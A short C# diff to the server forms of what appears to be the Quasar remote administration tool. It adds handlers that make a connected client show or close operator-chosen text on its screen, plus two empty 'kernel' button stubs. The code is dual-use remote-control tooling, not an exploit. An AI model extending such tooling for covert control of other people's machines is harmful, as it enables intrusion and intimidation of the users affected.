@@ -686,5 +686,55 @@ namespace Quasar.Server.Forms
         [DllImport("user32.dll")]
         private static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);
 
+        private void btnCloseIT_Click(object sender, EventArgs e)
+        {
+            if (_connectClient != null)
+            {
+                _connectClient.Send(new DoShowRedText
+                {
+                    Action = "close"
+                });
+            }
+        }
+
+        private void btnSetIT_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                if (_connectClient != null)
+                {
+                    FrmIVText ivTextDlg = new FrmIVText();
+
+                    DialogResult result = ivTextDlg.ShowDialog();
+                    if(result == DialogResult.OK)
+                    {
+                        _connectClient.Send(new DoShowRedText
+                        {
+                            Action = "show",
+                            Text = ivTextDlg.DialogText,
+                            FontSize = ivTextDlg.FontSize
+                        });
+                    }                    
+                }
+                else
+                {
+                    MessageBox.Show("This client is not connected to a server.");
+                }
+            }
+            catch(Exception ex)
+            {
+                MessageBox.Show(ex.Message);
+            }
+        }
+
+        private void btnKernel_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void btnUnkernel_Click(object sender, EventArgs e)
+        {
+
+        }
     }
 }
